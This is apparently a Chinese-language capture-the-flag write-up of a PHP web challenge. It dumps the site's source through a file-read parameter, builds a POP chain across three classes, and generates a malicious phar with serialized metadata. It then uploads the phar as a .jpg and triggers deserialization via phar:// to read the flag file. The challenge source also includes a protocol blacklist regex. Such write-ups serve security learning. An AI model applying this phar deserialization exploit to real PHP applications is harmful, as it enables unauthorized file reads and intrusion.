![](<./img/Pasted image 20230116084846.png>)

---

```
/index.php
```

![](<./img/Pasted image 20230116084900.png>)

---

```
/file.php?file=
```

![](<./img/Pasted image 20230116085154.png>)

![](<./img/Pasted image 20230116085342.png>)

---

```
/upload_file.php
```

![](<./img/Pasted image 20230116085508.png>)

# 获取源码

```
/file.php?file=index.php
```

```php
<?php 
header("content-type:text/html;charset=utf-8");  
include 'base.php';
?> 
```

```
/file.php?file=base.php
```

```php
<?php 
    session_start(); 
?> 
<!-- ... -->
<!--flag is in f1ag.php-->
```

```
/file.php?file=file.php
```

```php
<?php 
header("content-type:text/html;charset=utf-8");  
include 'function.php'; 
include 'class.php'; 
ini_set('open_basedir','/var/www/html/'); 
$file = $_GET["file"] ? $_GET['file'] : ""; 
if(empty($file)) { 
    echo "<h2>There is no file to show!<h2/>"; 
} 
$show = new Show(); 
if(file_exists($file)) { 
    $show->source = $file; 
    $show->_show(); 
} else if (!empty($file)){ 
    die('file doesn\'t exists.'); 
} 
?> 
```

```
/file.php?file=function.php
```

```php
222.90.67.205
<?php 
//show_source(__FILE__); 
include "base.php"; 
header("Content-type: text/html;charset=utf-8"); 
error_reporting(0); 
function upload_file_do() { 
    global $_FILES; 
    $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg"; 
    //mkdir("upload",0777); 
    if(file_exists("upload/" . $filename)) { 
        unlink($filename); 
    } 
    move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename); 
    echo '<script type="text/javascript">alert("上传成功!");</script>'; 
} 
function upload_file() { 
    global $_FILES; 
    if(upload_file_check()) { 
        upload_file_do(); 
    } 
} 
function upload_file_check() { 
    global $_FILES; 
    $allowed_types = array("gif","jpeg","jpg","png"); 
    $temp = explode(".",$_FILES["file"]["name"]); 
    $extension = end($temp); 
    if(empty($extension)) { 
        //echo "<h4>请选择上传的文件:" . "<h4/>"; 
    } 
    else{ 
        if(in_array($extension,$allowed_types)) { 
            return true; 
        } 
        else { 
            echo '<script type="text/javascript">alert("Invalid file!");</script>'; 
            return false; 
        } 
    } 
} 
?> 
```

```
/file.php?file=class.php
```

```php
 <?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?> 
```

```
/file.php?file=upload_file.php
```

```php
222.90.67.205
<?php 
include 'function.php'; 
upload_file(); 
?> 
<html> 
<head> 
<meta charest="utf-8"> 
<title>文件上传</title> 
</head> 
<body> 
<div align = "center"> 
        <h1>前端写得很low,请各位师傅见谅!</h1> 
</div> 
<style> 
    p{ margin:0 auto} 
</style> 
<div> 
<form action="upload_file.php" method="post" enctype="multipart/form-data"> 
    <label for="file">文件名:</label> 
    <input type="file" name="file" id="file"><br> 
    <input type="submit" name="submit" value="提交"> 
</div> 

</script> 
</body> 
</html>
```

```
/file.php?file=f1ag.php
```

```
hacker!
```

# 思路
`class.php`中有注释明示使用`phar`协议，同时可以通过`upload_file.php`上传文件，于是朝反序列化的方向思考

`Test`类有一个`file_get`方法，目标是调用到`Test.file_get('f1ag.php')`

通过`Test.get('<key>')`调用`Test.file_get('f1ag.php')`，前提是`Test.params`中包含键为`<key>`，值为`f1ag.php`的项

通过`Test.__get('<key>')`魔术方法可以调用到`Test.get('<key>')`

`class.php`中`Show.__toString()`魔术方法存在访问未定义成员的可能，通过令`Show.str['str']`为`Test`的一个实例，`<key>`为`source`来将`f1ag.php`内容编码后读取到`contents`局部变量中

`C1e4r.__destruct`魔术方法存在调用`test`的`__toString()`方法的可能，将`C1e4r.str`设为前面构造的`Show`的实例即可

## 生成`phar`

```php
<?php
class Test
{
	public $file;
    public $params;
    public function __construct()
    {
        $this->params = array('source' => '/var/www/html/f1ag.php');
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct()
    {
        $this->str = array('str' => new Test());
    }
}

class C1e4r
{
    public $test;
    public $str;
    public function __construct()
    {
        $this->str = new Show();
    }
}

$payload = new C1e4r();

@unlink('phar.phar');
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");
$phar->setMetadata($payload);
$phar->addFromString("abc.txt", "qaq");
$phar->stopBuffering();
```

## 计算文件名

```php
<?php
echo md5('phar.jpg' . '10.244.80.206') . '.jpg'
```

```
42574e9d70ad4a54c530fd9a294a46dc.jpg
```

## `phar`协议读取
```
/file.php?file=phar://upload/42574e9d70ad4a54c530fd9a294a46dc.jpg
```

![](<./img/Pasted image 20230116105804.png>)

![](<./img/Pasted image 20230116105849.png>)

#Web #PHP #phar #反序列化 